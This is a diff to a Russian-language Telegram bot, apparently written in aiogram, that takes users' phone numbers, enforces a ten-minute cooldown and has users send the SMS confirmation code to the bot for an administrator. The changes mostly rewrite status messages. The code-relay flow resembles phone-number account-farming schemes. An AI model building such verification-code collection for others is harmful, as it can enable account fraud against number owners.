@@ -127,9 +127,6 @@ async def start_timer(user_id: int, number: str, seconds: int = 600):
             remaining -= 1
         
         # Таймер закончился
-        text = "<b>✅ Таймер закончился!</b>\n<i>Этот номер снова доступен для отправки</i>"
-        await update_status_message(user_id, text)
-        await asyncio.sleep(3)
         await delete_status_message(user_id)
         if user_id in user_timer_task:
             del user_timer_task[user_id]
@@ -336,7 +333,6 @@ async def handle_all_messages(message: types.Message):
             
             # Проверяем, не на таймере ли этот номер
             if user_id in user_current_number and user_current_number[user_id] == number:
-                # Номер на таймере - показываем оставшееся время (таймер уже обновляется сам)
                 return
             
             # Проверяем в БД, не ставился ли этот номер недавно
@@ -348,10 +344,8 @@ async def handle_all_messages(message: types.Message):
             if last_time:
                 elapsed = int(time.time()) - last_time
                 if elapsed < 600:
-                    # Запускаем таймер для этого номера
                     user_current_number[user_id] = number
                     await start_timer(user_id, number, 600 - elapsed)
-                    # НЕ сбрасываем waiting_for_number - пользователь может отправить другой номер
                     return
             
             # Номер не блокирован - принимаем
@@ -381,10 +375,12 @@ async def handle_all_messages(message: types.Message):
                 parse_mode="HTML"
             )
             
-            # Создаем статусное сообщение
-            await update_status_message(
+            # ОТПРАВЛЯЕМ НОВОЕ СООБЩЕНИЕ (не обновляем статусное)
+            await delete_status_message(user_id)
+            await bot.send_message(
                 user_id,
-                f"<b>💼 Номер принят!</b>\n<i>Отправьте в чат с ботом SMS для подтверждения номера (оно придет в течение 3-х минут)</i>\n\n<b>Статус: код еще не запрошен</b>"
+                "<b>💼 Номер принят!</b>\n<i>Отправьте в чат с ботом SMS для подтверждения номера (оно придет в течение 3-х минут)</i>\n\n<b>Статус: код еще не запрошен</b>",
+                parse_mode="HTML"
             )
             return
         
@@ -416,9 +412,9 @@ async def handle_all_messages(message: types.Message):
                 parse_mode="HTML"
             )
             
-            # Удаляем статусное сообщение
+            # Удаляем старое сообщение и отправляем новое
             await delete_status_message(user_id)
-            await message.answer("<b>✅ Код отправлен администратору</b>", parse_mode="HTML")
+            await message.answer("<b>⏱️ Код отправлен!</b>\n<i>Ожидайте подтверждения номера (обычно занимает до 30-ти секунд)</i>", parse_mode="HTML")
             return
 
 # ========== ДЕЙСТВИЯ АДМИНА ==========
@@ -434,10 +430,10 @@ async def request_sms(callback: types.CallbackQuery):
         [InlineKeyboardButton(text="Отменить", callback_data="cancel_sms")]
     ])
     
-    # Обновляем статусное сообщение - меняем статус и добавляем кнопку отмены
+    # МЕНЯЕМ существующее сообщение (добавляем статус и кнопку)
     await update_status_message(
         user_id,
-        f"<b>💼 Номер принят!</b>\n<i>Отправьте в чат с ботом SMS для подтверждения номера (оно придет в течение 3-х минут)</i>\n\n<b>Статус: в ожидании кода</b>",
+        "<b>💼 Номер принят!</b>\n<i>Отправьте в чат с ботом SMS для подтверждения номера (оно придет в течение 3-х минут)</i>\n\n<b>Статус: в ожидании кода</b>",
         keyboard
     )
     
@@ -471,7 +467,11 @@ async def reject_request(callback: types.CallbackQuery):
         await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
     
     await delete_status_message(user_id)
-    await bot.send_message(user_id, "<b>🔐 Заявка отклонена!</b>\n<i>Причина: отклонена администрацией</i>", parse_mode="HTML")
+    await bot.send_message(
+        user_id,
+        "<b>🔐 Заявка отклонена!</b>\n<i>Попробуйте снова или отправьте другой номер телефона</i>",
+        parse_mode="HTML"
+    )
     await callback.answer("Заявка отклонена")
     await callback.message.delete_reply_markup()
 
